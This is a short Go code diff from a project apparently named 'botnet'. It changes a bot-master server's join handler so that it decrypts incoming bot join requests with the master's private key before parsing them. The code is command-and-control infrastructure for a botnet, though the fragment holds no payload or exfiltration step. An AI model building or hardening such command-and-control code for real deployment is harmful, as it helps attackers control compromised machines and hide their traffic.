@@ -6,6 +6,7 @@ import (
 	"io/ioutil"
 	"net/http"
 
+	"github.com/adrianosela/botnet/lib/encryption"
 	"github.com/gorilla/websocket"
 )
 
@@ -46,10 +47,16 @@ func (c *Config) joinHandler(w http.ResponseWriter, r *http.Request) {
 		w.Write([]byte("could not read request body"))
 		return
 	}
-	// FIXME: in the future, this request should be encrypted with the master
-	// pub key and we'll have to decrypt it
+	// decrypt encrypted join request JSON
+	decryptedJoinRequest, err := encryption.DecryptMessage(bodyBytes, c.botMaster.masterPrivKey)
+	if err != nil {
+		w.WriteHeader(http.StatusBadRequest)
+		w.Write([]byte("request was not appropriately encrypted"))
+		return
+	}
+	// unmarshal decrypted bytes
 	var jr JoinRequest
-	if err := json.Unmarshal(bodyBytes, &jr); err != nil {
+	if err := json.Unmarshal(decryptedJoinRequest, &jr); err != nil {
 		w.WriteHeader(http.StatusBadRequest)
 		w.Write([]byte("unexpected payload"))
 		return
